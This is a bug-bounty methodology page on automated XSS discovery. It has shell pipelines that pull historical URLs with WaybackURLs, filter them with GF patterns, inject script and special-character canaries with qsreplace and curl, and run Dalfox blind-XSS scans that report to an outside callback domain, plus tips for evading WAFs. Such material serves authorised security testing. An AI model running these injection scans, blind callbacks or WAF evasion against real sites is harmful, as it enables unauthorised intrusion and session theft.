# Automated XSS Detection (Dalfox, WaybackURLs, GF Patterns)

Manual XSS hunting at bug-bounty scale starts from historical URLs, narrows them with pattern databases, and fires payloads automatically — then human review confirms what the tools flag. This pipeline catches reflected, blind, and unsanitized-parameter candidates quickly across large scopes. Unreviewed tool output is noise; always confirm hits manually before reporting.

Concepts, payload craft, and bypasses: [Xss.md](./Xss.md) · [XSS_Bypass.md](./XSS_Bypass.md) · Contexts: [post_message_xss.md](./post_message_xss.md) · [Bypass_CSP.md](./Bypass_CSP.md)

## Hunting Checklist

0. Install Go prerequisites (required by all tomnomnom tooling).
1. Extract historical URLs for the target with **WaybackURLs** (or gau).
2. Narrow candidates with **GF patterns** (`gf xss`) or `grep '='`.
3. **Reflected:** inject a canary payload into every parameter with `qsreplace`, fetch with `curl`, and grep for the unescaped canary.
4. **Blind:** pipe the trimmed parameter list through Dalfox with a callback domain (`-b blindxss.xss.ht`) and monitor the listener.
5. **Special-character survival:** flag parameters that echo `"><()` unencoded — those are high-probability injection points to verify manually.
6. Verify every hit manually (correct context, working bypass, browser execution) — never report raw tool output.
7. Scale: wrap the pipelines in a script (e.g. [QuickXSS](https://github.com/theinfosecguy/QuickXSS)) and run scope-wide.

## Test Cases & Examples

### Prerequisites: installing Go

```bash
sudo apt install -y golang
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
source .bashrc
```

### Blind XSS pipeline (Dalfox + callback)

```bash
waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && \
cat Possible_xss.txt | dalfox -b blindxss.xss.ht pipe > output.txt
```

### Reflected XSS pipeline (canary echo check)

```bash
waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | \
while read host; do
    curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && \
    echo "$host \033[0;31m Vulnerable"
done
```

### Parameters that do not filter special characters

```bash
echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
cat waybackurls.txt | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | \
qsreplace '"><()' | tee combinedfuzz.json && \
cat combinedfuzz.json | while read host; do
    curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && \
    echo -e "$host \033[91m Vulnerable \e[0m \n" || \
    echo -e "$host \033[92m Not Vulnerable \e[0m \n"
done | tee XSS.txt
```

## Bypass Techniques

- A "Vulnerable" canary hit that never executes in the browser is usually an encoding/context issue — re-test the parameter with context-appropriate breakouts from [XSS_Bypass.md](./XSS_Bypass.md).
- Dalfox can miss DOM sinks; pair automation with manual DOM review via [post_message_xss.md](./post_message_xss.md) and Burp's DOM Invlector.
- If WAF blocks tool traffic (rate/UA/payload signatures), throttle requests, change User-Agent, and run bypass payloads from [XSS_Bypass.md](./XSS_Bypass.md); fingerprint the WAF with WhatWaf first.
- Blocked by CSP after a successful injection? Continue in [Bypass_CSP.md](./Bypass_CSP.md).

## Tools & Resources

| Tool | GitHub Repository |
|------|------------------|
| **Dalfox** | [Dalfox](https://github.com/hahwul/dalfox) |
| **WaybackURLs** | [WaybackURLs](https://github.com/tomnomnom/waybackurls) |
| **GF** | [GF](https://github.com/tomnomnom/gf) |
| **GF Patterns** | [GF Patterns](https://github.com/1ndianl33t/Gf-Patterns) |
| **qsreplace** | [qsreplace](https://github.com/tomnomnom/qsreplace) |

Complete ready-made script: [QuickXSS](https://github.com/theinfosecguy/QuickXSS)

Contacts for questions/discussion (original authors): [@g0t_rOoT_](https://twitter.com/g0t_rOoT_) · [@Fani Malik](https://twitter.com/fanimalikhack) · [@Faizee Asad](https://twitter.com/faizee_asad) · [@Prince Prafull](https://twitter.com/princeprafull3)

## Report Tips

- Automation output is a lead list, not evidence: reproduce the XSS live (browser alert / callback email for blind) before submitting.
- For blind XSS, attach the XSS Hunter callback (page URL, cookies-visible flag, admin-panel context) as the primary proof — impact framing "executes where staff view user input" beats the raw hit.
- Report per-parameter findings with the exact vulnerable URL and note the scan scope/timeframe so duplicates and false positives are easy for triage to rule in/out.
